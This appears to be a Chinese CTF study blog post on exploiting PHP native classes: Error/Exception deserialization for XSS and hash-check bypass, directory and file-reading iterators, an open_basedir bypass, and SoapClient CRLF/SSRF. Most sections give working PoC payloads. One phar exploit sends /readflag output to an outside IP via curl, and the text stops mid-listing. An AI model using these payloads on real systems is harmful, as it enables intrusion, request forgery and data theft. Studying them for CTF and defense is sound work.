    <content type="html"><![CDATA[<h1 id="查看各方法内置类"><a href="#查看各方法内置类" class="headerlink" title="查看各方法内置类"></a>查看各方法内置类</h1><p> 通过这段代码查看方法的类，这里看到__toString方法对应的Error类  </p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p><h1 id="利用Error-Exception内置类进行XSS"><a href="#利用Error-Exception内置类进行XSS" class="headerlink" title="利用Error/Exception内置类进行XSS"></a>利用Error/Exception内置类进行XSS</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p>利用条件:<br>php7以上<br>开启报错情况下<br> Error类是php的一个常见类，用于自定义一个Error，当用户输入错误的值，回显Error页面，php7版本会存在类似的XSS漏洞。Error::__toString，Error类存在__toString的方法，该方法进行类当作字符串进行回应，也就是echo $l3ife会显示什么。php对象当作一个字符串输出（echo $l3ife）会触发to_String方法。一般用于反序列化漏洞和XSS漏洞。<br> 本地创建error.php(php版本设置为7.0)  </p><pre><code class="php">&lt;?phphighlight_file(&#39;2.php&#39;);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt; </code></pre><p> 这段反序列化函数，并不存在自定义类，不可以打反序列化，可以用php反序列化的php内置类<br>poc:</p><pre><code class="php">&lt;?php    $a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p><h2 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h2><p>利用条件:<br>php5、php7<br>开启报错的情况下</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt;</code></pre><p>poc:</p><pre><code class="php">&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p><h2 id="BJDCTF-2nd-xss之光"><a href="#BJDCTF-2nd-xss之光" class="headerlink" title="[BJDCTF 2nd]xss之光"></a><strong>[BJDCTF 2nd]xss之光</strong></h2><p> 通过git拿到源码  </p><pre><code class="php">&lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;];Echo unserialize($a);</code></pre><p> 给了GET传参，进行反序列化，不知道怎么自定义类，遇到了反序列化没有POP链的情况。只能通过php内置类进行反序列化，又存在echo，可以用__toString方法返回对象进行反序列化。该题为XSS之光，所以可以通过XSS拿出FLAG。<br> 思路：flag一般在COOKIE的信息里。<br>poc:</p><pre><code class="php">&lt;?php$poc=new    Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);Echo urlencode(serialize($poc));?&gt;反弹cookie</code></pre><p> 将得到的结果传入<br>/?yds_is_so_beautiful=$POC  </p><h1 id="利用Error-Exception-内置类绕过哈希比较"><a href="#利用Error-Exception-内置类绕过哈希比较" class="headerlink" title="利用Error/Exception 内置类绕过哈希比较"></a>利用Error/Exception 内置类绕过哈希比较</h1><p> 测试代码  :</p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;</code></pre><p> 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。  </p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\r\n\r\n&quot;;echo $b;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a 和 $b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。<br>可以利用这个方法果然哈希比较。  </p><h2 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a><strong>[2020 极客大挑战]Greatphp</strong></h2><p> 考点：php内置绕过哈希比较、php取反绕过  </p><pre><code class="php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p> 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。<br>主要是绕过这个</p><pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code></pre><p> md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。<br>我们先来测试一下:<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="img"><br>注意两个Error要在同一行哦，否则他们报错的输出有行数的不同！<br>payload:</p><pre><code class="php">&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;&#125;//$cmd = &quot;flag.php&quot;;//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;//print $str;echo &quot;\r\n\r\n&quot;;$c = new SYCLOVER();$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);echo urlencode(serialize($c));?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="img"><br>这里其实有一个地方要注意:</p><pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;</code></pre><p>为什么最前面要加上?&gt;呢<br>我们还记得Error类返回什么吗?<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="img"><br>Error是无法直接返回我们所需要的paylaod的，它前面有Error:影响，我们可以用&gt;?去闭合它<br>最终我们的语句就变为:</p><pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)</code></pre><p>这样实际上是不影响语句的执行</p><h1 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">版本：php5、php7、php8Filesystemlterator版本：PHP 5 &gt;= 5.3.0, PHP 7, PHP 8</code></pre><pre><code class="php">&lt;?php highlight_file(__file__); $dir=$_GET[&#39;cmd&#39;]; $a=new DirectoryIterator($dir); foreach($a as $f)&#123;     echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;);      &#125; ?&gt; </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="img"><br> 查看该类，发现__toString()方法<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="img"><br> 会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的toString() 方法，输出指定目录里面经过排序之后的第一个文件名 配合glob://协议使用模式匹配来寻找我们想要的文件路径 </p><h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。<br>该类的使用方法与DirectoryIterator 类也是基本相同的：(子类与父类的关系)</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="img"><br>遍历一下</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;foreach($dir as $tmp)&#123;    echo($tmp.&#39;&lt;br&gt;&#39;);    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="img"></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject 类和 SplFileinfo为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="img"></p><pre><code class="php">    &lt;?php    $dir=new SplFileObject(&quot;flag.php&quot;);    echo $dir;    ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="img"><br> 对文件中的每一行内容进行遍历：  </p><pre><code class="php">&lt;?php$dir = new SplFileObject(&quot;flag.php&quot;);foreach($dir as $tmp)&#123;    echo ($tmp.&#39;&lt;br&gt;&#39;);&#125;?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="img"><br>出题的时候如果看到形如:</p><pre><code class="php">    echo new $this-&gt;key($this-&gt;value);      $this -&gt; a = new $this-&gt;key($this-&gt;value);    echo $this-&gt;a;</code></pre><p> 只需要让**$this-&gt;key<strong>值赋为我们想用原生函数，</strong>$this-&gt;value**赋为路径，查就行了。但是这种构造类型的方法的局限性就是只能查一个路径上的一个文件。  </p><pre><code class="php">&lt;?phpclass HY&#123;    public $a;    public $b;&#125;$c = new HY();$c-&gt;a=&quot;SplFileObject&quot;;$c-&gt;b=&quot;flag.php&quot;;echo new $c-&gt;a($c-&gt;b);?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="img"></p><h1 id="突破open-basedir的限制"><a href="#突破open-basedir的限制" class="headerlink" title="突破open_basedir的限制"></a>突破open_basedir的限制</h1><p> ctfshow web74  </p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0); // 你们在炫技吗？if(isset($_POST[&#39;c&#39;]))&#123;    $c=$_POST[&#39;c&#39;];    eval($c);    $s=ob_get_contents();    ob_end_clean();    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__); &#125; ?&gt;?&gt;</code></pre><p>首先介绍一下ob_get_contents()和ob_end_clean这两个函数。<br>缓冲区(Buffer)就是在内存中预留指定大小的存储空间用来对I/O的数据做临时存储，这部分预留的内存空间叫缓冲区。也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>ob_get_contents:返回输出缓冲区的内容，只是得到缓冲区的内容，但不清除它。<br>ob_end_clean:清空（擦除）缓冲区并关闭输出缓冲。<br>eval执行我们的命令后，输出flag内容，但是输出要经过缓冲区，对输出数据进行缓存，通过ob_get_contents() 原来的数据赋值给了$s，然后又用ob_end_clean将缓冲区清空了，那么eval就没办法输出了（缓冲区都被清空了），所以就只有$s一个输出了。所以这里可以通过exit()或者die() （exit别名）退出，这样的话就没有ob_end_clean这个缓冲区清空操作，输出就能正常输出。<br><strong>构造payload:</strong></p><pre><code class="php">c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>然后读取文件</p><pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();</code></pre><h1 id="利用SoapClient类进行CRLF-SSRF"><a href="#利用SoapClient类进行CRLF-SSRF" class="headerlink" title="利用SoapClient类进行CRLF+SSRF"></a>利用SoapClient类进行CRLF+SSRF</h1><p> soapClient：专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。<br>类介绍：  </p><pre><code class="php">SoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> 存在_ _call方法，当__call方法被触发，可以发送HTTP和HTTPS请求。使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。  </p><pre><code class="php">函数形式：    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])第一个参数为指明是否为wsdl模式，为null则为非wsdl模式wsdl，就是一个xml格式的文档，用于描述Web Server的定义第二个参数为array，wsdl模式下可选；非wsdl模式下，需要设置location和uri，location就是发送SOAP服务器的URL，uri是服务的命名空间</code></pre><p> 首先测试下正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> 从上图可以看到，SOAPAction处可控，可以把\x0d\x0a注入到SOAPAction，POST请求的header就可以被控制  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>第一个参数是用来指明是否是 wsdl 模式。<br>第二个参数为一个数组，如果在 wsdl 模式下，此参数可选；如果在非 wsdl 模式下，则必须设置 location 和 uri 选项，其中 location 是要将请求发送到的 SOAP 服务器的 URL，而 uri 是 SOAP 服务的目标命名空间。具体可以设置的参数可见官方文档<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p><p>但Content-Type在SOAPAction的上面，就无法控制Content-Typ,也就不能控制POST的数据<br>在header里User-Agent在Content-Type前面</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agent同样可以注入CRLF，控制Content-Type的值</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299243252-81156156-b050-4637-bea8-54bd0d302863-166888019827967.png" alt="img"></p><p>如上，使用SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>+CRLF<strong>可以生成任意POST请求</strong>。<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p><h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(我这里想复现一下，感觉code那里有问题，无法进行注册和登录操作)<br>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入a`, {serialize object});#引发反序列化漏洞<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="img"><br>反序列化后的SoapClient对象去调用不存在的getcountry方法，调用__call，实现SSRF<br>控制PHPSESSID为自己的session，SSRF来进行admin登陆</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1/index.php?action=login&#39;;$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo bin2hex($aaa);?&gt;</code></pre><p> 再使用上面的PHPSESSID访问，就是admin了  </p><h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png" alt="img"><br>这里只允许本地访问，我们要进行ssrf<br>构造exp:</p><pre><code class="php">&lt;?phpclass File&#123;    public $file_name;    public $func = &quot;SoapClient&quot;;    function __construct($file_name)&#123;        $this-&gt;file_name = $file_name;    &#125;&#125;$target = &#39;http://127.0.0.1/admin.php&#39;;$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,);$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt; __HALT_COMPILER();&lt;/script&gt;&#39;); //设置stub$o = new File($f);$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>详细过程可查看:<a href="https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c#">https://www.yuque.com/docs/share/ad3f54ca-b95b-4aa9-add6-e6e8e82be57c?#</a> 《web刷题》</p><h1 id="利用ReflectionMethod读取User类的方法"><a href="#利用ReflectionMethod读取User类的方法" class="headerlink" title="利用ReflectionMethod读取User类的方法"></a>利用ReflectionMethod读取User类的方法</h1><h2 id="ReflectionMethod类"><a href="#ReflectionMethod类" class="headerlink" title="ReflectionMethod类"></a>ReflectionMethod类</h2><p>ReflectionMethod的类报告了方法的相关信息<br>版本：(PHP 5, PHP 7, PHP 8)</p><h3 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h3><pre><code class="php">$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回nullvar_dump($ref-&gt;inNamespace()); // 是否在命名空间中var_dump($ref-&gt;getConstants()); // 获取所有定义的常量var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回falsevar_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间var_dump($ref-&gt;getStartLine()); // 获取起始行号print_r($ref-&gt;getStaticProperties()); // 获取静态属性print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制var_dump($ref-&gt;isFinal()); // 检查类是否声明为 finalvar_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类var_dump($ref-&gt;isTrait()); // 返回了是否为一个 traitvar_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。var_dump($ref-&gt;newInstance());// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。//这个参数以 array 形式传递到类的构造函数。var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。</code></pre><pre><code>### ReflectionMethod API```php/*ReflectionMethod::__construct — ReflectionMethod 的构造函数ReflectionMethod::export — 输出一个回调方法ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例ReflectionMethod::getModifiers — 获取方法的修饰符ReflectionMethod::getPrototype — 返回方法原型 (如果存在)ReflectionMethod::invoke — InvokeReflectionMethod::invokeArgs — 带参数执行ReflectionMethod::isAbstract — 判断方法是否是抽象方法ReflectionMethod::isConstructor — 判断方法是否是构造方法ReflectionMethod::isDestructor — 判断方法是否是析构方法ReflectionMethod::isFinal — 判断方法是否定义 finalReflectionMethod::isPrivate — 判断方法是否是私有方法ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)ReflectionMethod::isPublic — 判断方法是否是公开方法ReflectionMethod::isStatic — 判断方法是否是静态方法ReflectionMethod::setAccessible — 设置方法是否访问ReflectionMethod::__toString — 